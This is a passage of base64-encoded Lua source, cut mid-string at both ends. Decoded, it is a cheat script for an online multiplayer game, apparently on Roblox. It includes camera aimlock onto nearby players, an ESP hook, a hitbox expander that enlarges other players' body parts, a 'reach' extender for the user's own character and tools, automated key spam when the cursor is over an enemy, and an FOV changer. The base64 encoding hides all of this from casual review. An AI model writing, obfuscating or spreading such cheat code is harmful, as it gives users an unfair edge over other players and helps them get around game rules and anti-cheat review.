lsZCgiSGVhZCIpCiAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBVc2VySW5wdXRTZXJ2aWNlOklzTW91c2VCdXR0b25QcmVzc2VkKEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHNjcmVlblBvcywgb25TY3JlZW4gPSBjYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQodGFyZ2V0UGFydC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9uU2NyZWVuIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlTW92ZUV2ZW50KHNjcmVlblBvcy5YLCBzY3JlZW5Qb3MuWSwgZ2FtZSkgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuQ3Vyc29yTG9ja1VzZXIgPT0gIiIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjdXJzb3JMb2NrVGFyZ2V0ID0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgIEN1cnNvckxhYmVsLlRleHQgPSAiU3RhdHVzOiBUYXJnZXQgTG9zdCIKICAgICAgICAgICAgICAgICAgICAgICAgQ3Vyc29yTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBBSU1MT0NLIExPR0lDIChNb3ZlZCB0byBCaW5kVG9SZW5kZXJTdGVwIGZvciBQcmlvcml0eSkKICAgICAgICBpZiBDb25maWcuQWltbG9jayBvciBDb25maWcuWm9uZUxvY2sgdGhlbgogICAgICAgICAgICAtLSAyLiBab25lIFRyaWdnZXIgKERpc3RhbmNlKQogICAgICAgICAgICBpZiBDb25maWcuWm9uZUxvY2sgYW5kIChub3QgYWltbG9ja1RhcmdldCBvciBhaW1sb2NrRW5kVGltZSB+PSBtYXRoLmh1Z2UpIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBhaW1sb2NrVGFyZ2V0IGFuZCByb290UGFydCBhbmQgdGljaygpID4gYWltbG9ja0Nvb2xkb3duIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBtaW5EaXN0ID0gQ29uZmlnLlpvbmVEaXN0YW5jZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldEZvdW5kID0gbmlsCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHAgfj0gcGxheWVyIGFuZCBwLkNoYXJhY3RlciBhbmQgcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIHAuQ2hhcmFjdGVyLkh1bWFub2lkLkhlYWx0aCA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlzdCA9IChyb290UGFydC5Qb3NpdGlvbiAtIHAuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGlzdCA8IG1pbkRpc3QgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1pbkRpc3QgPSBkaXN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0Rm91bmQgPSBwLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldEZvdW5kIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYWltbG9ja1RhcmdldCA9IHRhcmdldEZvdW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGFpbWxvY2tFbmRUaW1lID0gdGljaygpICsgQ29uZmlnLlpvbmVEdXJhdGlvbgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgLS0gQ2hlY2sgRXhwaXJ5IChHbG9iYWwpCiAgICAgICAgICAgIGlmIGFpbWxvY2tUYXJnZXQgYW5kIHRpY2soKSA+IGFpbWxvY2tFbmRUaW1lIHRoZW4KICAgICAgICAgICAgICAgIGFpbWxvY2tUYXJnZXQgPSBuaWwKICAgICAgICAgICAgICAgIGFpbWxvY2tDb29sZG93biA9IHRpY2soKSArIENvbmZpZy5ab25lQ29vbGRvd24KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSAyLiBBcHBseSBMb2NrCiAgICAgICAgICAgIGlmIGFpbWxvY2tUYXJnZXQgdGhlbgogICAgICAgICAgICAgICAgaWYgYWltbG9ja1RhcmdldC5QYXJlbnQgYW5kIGFpbWxvY2tUYXJnZXQ6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIGFpbWxvY2tUYXJnZXQuSHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdCA9IGFpbWxvY2tUYXJnZXQ6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciBhaW1sb2NrVGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICAgICAgICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgY2FtZXJhLkNGcmFtZSA9IENGcmFtZS5uZXcoY2FtZXJhLkNGcmFtZS5Qb3NpdGlvbiwgcm9vdC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGFpbWxvY2tUYXJnZXQgPSBuaWwKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBhaW1sb2NrVGFyZ2V0ID0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIC0tIE1PVVNFIENMSUNLIExPQ0sgTE9HSUMKICAgICAgICBpZiBDb25maWcuTW91c2VDbGlja0xvY2sgdGhlbgogICAgICAgICAgICBpZiBVc2VySW5wdXRTZXJ2aWNlOklzTW91c2VCdXR0b25QcmVzc2VkKEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBtb3VzZUNsaWNrVGFyZ2V0IHRoZW4KICAgICAgICAgICAgICAgICAgICBtb3VzZUNsaWNrVGFyZ2V0ID0gZ2V0Q2xvc2VzdFBsYXllclRvTW91c2UoQ29uZmlnLk1vdXNlQ2xpY2tGT1YgPiAwIGFuZCBDb25maWcuTW91c2VDbGlja0ZPViBvciAxMDAsIHRydWUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgbW91c2VDbGlja1RhcmdldCBhbmQgbW91c2VDbGlja1RhcmdldC5DaGFyYWN0ZXIgYW5kIG1vdXNlQ2xpY2tUYXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBtb3VzZUNsaWNrVGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCByb290ID0gbW91c2VDbGlja1RhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBvciBtb3VzZUNsaWNrVGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgaWYgcm9vdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGNhbWVyYS5DRnJhbWUgPSBDRnJhbWUubmV3KGNhbWVyYS5DRnJhbWUuUG9zaXRpb24sIHJvb3QuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgbW91c2VDbGlja1RhcmdldCA9IG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIG1vdXNlQ2xpY2tUYXJnZXQgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgdGFibGUuaW5zZXJ0KENvbm5lY3Rpb25zLCB3b3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oZGVzY2VuZGFudCkKICAgICAgICBpZiBDb25maWcuVG9vbENvbG9yQ2hhbmdlciB0aGVuCiAgICAgICAgICAgIGFwcGx5VG9vbENvbG9yKGRlc2NlbmRhbnQpCiAgICAgICAgZW5kCiAgICBlbmQpKQoKICAgIHRhYmxlLmluc2VydChDb25uZWN0aW9ucywgUnVuU2VydmljZS5TdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oXywgZGVsdGFUaW1lKQogICAgZW5kKSkKICAgIAogICAgdGFibGUuaW5zZXJ0KENvbm5lY3Rpb25zLCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbihkZWx0YVRpbWUpCiAgICAgICAgVXBkYXRlRVNQKCkKCiAgICAgICAgLS0gVE9PTCBDT0xPUiBDSEFOR0VSIExPR0lDIChFWFBBTkRFRCkKICAgICAgICBpZiBDb25maWcuVG9vbENvbG9yQ2hhbmdlciBhbmQgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgZm9yIF8sIGRlc2NlbmRhbnQgaW4gcGFpcnMoY2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBhcHBseVRvb2xDb2xvcihkZXNjZW5kYW50KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBUcmlnZ2VyIEZsYXNoU3RlcCBMb2dpYyAoU3BhbSBSIHdoaWxlIGhvdmVyaW5nKQogICAgICAgIGlmIENvbmZpZy5UcmlnZ2VyRmxhc2hTdGVwIGFuZCBodW1hbm9pZCBhbmQgaHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IG1vdXNlLlRhcmdldAogICAgICAgICAgICBsb2NhbCB0YXJnZXRQbGF5ZXIgPSBuaWwKICAgICAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQuUGFyZW50IGFuZCB0YXJnZXQuUGFyZW50OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgIHRhcmdldFBsYXllciA9IFBsYXllcnM6R2V0UGxheWVyRnJvbUNoYXJhY3Rlcih0YXJnZXQuUGFyZW50KQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIHRhcmdldFBsYXllciBhbmQgdGFyZ2V0UGxheWVyIH49IHBsYXllciBhbmQgKENvbmZpZy5UcmlnZ2VyRmxhc2hTdGVwVXNlciA9PSAiIiBvciB0YXJnZXRQbGF5ZXIuTmFtZSA9PSBDb25maWcuVHJpZ2dlckZsYXNoU3RlcFVzZXIpIHRoZW4KICAgICAgICAgICAgICAgIC0tIFNwYW0gUiBrZXkgd2hpbGUgaG92ZXJpbmcgb3ZlciBlbmVteQogICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLlIsIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KGZhbHNlLCBFbnVtLktleUNvZGUuUiwgZmFsc2UsIGdhbWUpCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIEZPViBDSEFOR0VSCiAgICAgICAgaWYgY2FtZXJhIGFuZCBDb25maWcuRk9WVmFsdWUgfj0gNzAgdGhlbgogICAgICAgICAgICBjYW1lcmEuRmllbGRPZlZpZXcgPSBDb25maWcuRk9WVmFsdWUKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBISVRCT1ggRVhURU5ERVIgTE9HSUMKICAgICAgICBpZiBDb25maWcuSGl0Ym94RXhwYW5kZXIgdGhlbgogICAgICAgICAgICB3YXNIaXRib3hFeHBhbmRlZCA9IHRydWUKICAgICAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwIH49IHBsYXllciBhbmQgcC5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHNob3VsZEV4cGFuZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLkhpdGJveE1vZGVBbGwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBzaG91bGRFeHBhbmQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuSGl0Ym94VGFyZ2V0VXNlciB+PSAiIiBhbmQgc3RyaW5nLmZpbmQocC5OYW1lOmxvd2VyKCksIENvbmZpZy5IaXRib3hUYXJnZXRVc2VyOmxvd2VyKCkpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNob3VsZEV4cGFuZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIHNob3VsZEV4cGFuZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKHAuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgKHBhcnQuTmFtZSA9PSAiSHVtYW5vaWRSb290UGFydCIgb3IgcGFydC5OYW1lID09ICJIZWFkIiBvciBwYXJ0Lk5hbWUgPT0gIlRvcnNvIiBvciBwYXJ0Lk5hbWUgPT0gIlVwcGVyVG9yc28iIG9yIHBhcnQuTmFtZSA9PSAiTG93ZXJUb3JzbyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgcGFydDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydDpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIsIHBhcnQuU2l6ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0LlNpemUgPSBwYXJ0OkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIikgKiBDb25maWcuSGl0Ym94U2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkhpdGJveFRyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5DYW5Ub3VjaCA9IHRydWUgLS0gQXNzdXJlIHF1ZSBsZXMgw6l2w6luZW1lbnRzIFRvdWNoZWQgZm9uY3Rpb25uZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBwYXJ0LlNoYXBlID0gRW51bS5QYXJ0VHlwZS5CYWxsIGVuZCkgLS0gRm9yY2UgUm91bmQgSGl0Ym94CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAtLSBSZXNldCBub24tdGFyZ2V0cyBpZiB0aGV5IHdlcmUgZXhwYW5kZWQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHVtID0gcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gcGFpcnMocC5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIGFuZCBwYXJ0OkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuU2l6ZSA9IHBhcnQ6R2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQ6U2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiLCBuaWwpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGFydC5OYW1lID09ICJIdW1hbm9pZFJvb3RQYXJ0IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAg" .. "ICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRlc2MgPSBQbGF5ZXJzOkdldEh1bWFub2lkRGVzY3JpcHRpb25Gcm9tVXNlcklkKHAuVXNlcklkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkZXNjIHRoZW4gQXBwbHlEZXNjcmlwdGlvbkN1c3RvbShodW0sIGRlc2MpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICBlbHNlaWYgd2FzSGl0Ym94RXhwYW5kZWQgdGhlbgogICAgICAgICAgICB3YXNIaXRib3hFeHBhbmRlZCA9IGZhbHNlCiAgICAgICAgICAgIGZvciBfLCBwIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgaWYgcCB+PSBwbGF5ZXIgYW5kIHAuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBodW0gPSBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKHAuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIGFuZCBwYXJ0OkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5TaXplID0gcGFydDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0OlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIiwgbmlsKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGFydC5OYW1lID09ICJIdW1hbm9pZFJvb3RQYXJ0IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5UcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5DYW5Db2xsaWRlID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkZXNjID0gUGxheWVyczpHZXRIdW1hbm9pZERlc2NyaXB0aW9uRnJvbVVzZXJJZChwLlVzZXJJZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkZXNjIHRoZW4gQXBwbHlEZXNjcmlwdGlvbkN1c3RvbShodW0sIGRlc2MpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gU0VMRiBSRUFDSCBMT0dJQyAoQXZhdGFyICYgVG9vbCBFeHRlbmRlcikKICAgICAgICBpZiBDb25maWcuUmVhY2ggYW5kIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIC0tIEdsb2JhbCBSZWFjaCAoVG91dCBsZSBjb3JwcyArIEFjY2Vzc29pcmVzICsgT3V0aWxzKQogICAgICAgICAgICAtLSBHbG9iYWwgUmVhY2ggKE9wdGltaXplZCBmb3IgU2FuZ3VpbmUgQXJ0ICYgTWVsZWUpCiAgICAgICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKGNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgYW5kIHBhcnQuTmFtZSB+PSAiSHVtYW5vaWRSb290UGFydCIgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBwYXJ0OkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwYXJ0OlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIiwgcGFydC5TaXplKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHBhcnQuU2l6ZSA9IHBhcnQ6R2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiKSAqIENvbmZpZy5SZWFjaFNpemUKICAgICAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIHBhcnQuTWFzc2xlc3MgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgcGFydC5UcmFuc3BhcmVuY3kgPSBDb25maWcuUmVhY2hUcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICBwYXJ0LkNhblRvdWNoID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIHBhcnQuQ2FuUXVlcnkgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgcGFydC5DYW5RdWVyeSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBwYXJ0LlNoYXBlID0gRW51bS5QYXJ0VHlwZS5CYWxsIGVuZCkgLS0gRm9yY2UgUm91bmQgSGl0Ym94CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBMaXN0ZW5lciBmb3IgdHJhbnNpZW50IGhpdGJveGVzIChNMXMgLyBTa2lsbHMpCiAgICAgICAgICAgIGlmIG5vdCByZWFjaENvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgcmVhY2hDb25uZWN0aW9uID0gY2hhcmFjdGVyLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoaWxkKQogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5SZWFjaCBhbmQgY2hpbGQ6SXNBKCJCYXNlUGFydCIpIGFuZCBjaGlsZC5OYW1lIH49ICJIdW1hbm9pZFJvb3RQYXJ0IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBjaGlsZDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIpIHRoZW4gY2hpbGQ6U2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiLCBjaGlsZC5TaXplKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgY2hpbGQuU2l6ZSA9IGNoaWxkOkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIikgKiBDb25maWcuUmVhY2hTaXplCiAgICAgICAgICAgICAgICAgICAgICAgIGNoaWxkLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBjaGlsZC5NYXNzbGVzcyA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgY2hpbGQuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLlJlYWNoVHJhbnNwYXJlbmN5CiAgICAgICAgICAgICAgICAgICAgICAgIGNoaWxkLkNhblRvdWNoID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBjaGlsZC5DYW5RdWVyeSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgY2hpbGQuQ2FuUXVlcnkgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIGNoaWxkLlNoYXBlID0gRW51bS5QYXJ0VHlwZS5CYWxsIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBpZiByZWFjaENvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgcmVhY2hDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgcmVhY2hDb25uZWN0aW9uID0gbmlsCiAgICAgICAgICAgICAgICAtLSBSZXN0b3JlIFNpemVzCiAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKGNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgcGFydDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuU2l6ZSA9IHBhcnQ6R2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydDpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsU2l6ZSIsIG5pbCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIC0tIFJlc2V0IENoYXJhY3RlciBBcHBlYXJhbmNlCiAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRlc2MgPSBQbGF5ZXJzOkdldEh1bWFub2lkRGVzY3JpcHRpb25Gcm9tVXNlcklkKHBsYXllci5Vc2VySWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRlc2MgYW5kIGh1bWFub2lkIHRoZW4gQXBwb